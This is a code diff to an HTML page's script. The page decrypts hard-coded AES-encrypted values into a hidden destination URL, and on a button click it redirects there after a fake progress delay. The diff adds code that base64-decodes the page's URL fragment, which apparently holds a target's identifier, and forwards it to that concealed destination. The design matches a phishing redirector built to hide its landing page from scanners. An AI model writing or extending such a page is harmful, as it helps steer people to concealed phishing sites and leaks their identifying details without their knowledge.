@@ -223,14 +223,31 @@ button{
 </div>
 
 <script>
+/* =====================================
+   🔒 INSERT YOUR ENCRYPTED VALUES
+===================================== */
 const e = "NGbvHvefLm0IQW73d9Ojv+IJx+jsMgH4wn/eESxVnXXjuImWIVvFSPQ=";
 const t = "vXzGTtWBLwaL3q+3";
 const n = "xjBFkJpjNCVXYUBoOIlTAQ==";
 
+/* =====================================
+   🔐 HELPERS
+===================================== */
 const te = new TextEncoder();
 const td = new TextDecoder();
 const b64 = s => Uint8Array.from(atob(s), c => c.charCodeAt(0));
 
+function safeBase64Decode(str){
+  try{
+    return atob(str);
+  }catch(e){
+    return str; // not base64, return as-is
+  }
+}
+
+/* =====================================
+   🔐 DECRYPT FUNCTION
+===================================== */
 async function decrypt(){
   const master = await crypto.subtle.importKey(
     "raw",
@@ -262,19 +279,51 @@ async function decrypt(){
   return td.decode(dec);
 }
 
-function trigger(tag=""){
+/* =====================================
+   🔁 CLICK-TRIGGERED REDIRECT
+   (WITH HASH DECODER + CARRYOVER)
+===================================== */
+function trigger(tag = ""){
   document.getElementById("progress").style.display = "block";
 
   setTimeout(async () => {
-    try {
+    try{
       const base = await decrypt();
-      location.href = tag ? `${base}?f=${tag}` : base;
-    } catch (err) {
+
+      // extract hash (without #)
+      let hash = window.location.hash
+        ? window.location.hash.substring(1)
+        : "";
+
+      // decode hash if encoded
+      if(hash){
+        hash = safeBase64Decode(hash);
+      }
+
+      let target = base;
+
+      // append tag
+      if(tag){
+        target += (base.includes("?") ? "&" : "?") + "f=" + encodeURIComponent(tag);
+      }
+
+      // append hash
+      if(hash){
+        target += "#" + hash;
+      }
+
+      location.href = target;
+
+    }catch(err){
       console.error("DECRYPT ERROR:", err);
       alert("Decrypt failed — check console");
     }
   }, 1400);
 }
 </script>
+
+
+</body>
+</html>
 
 
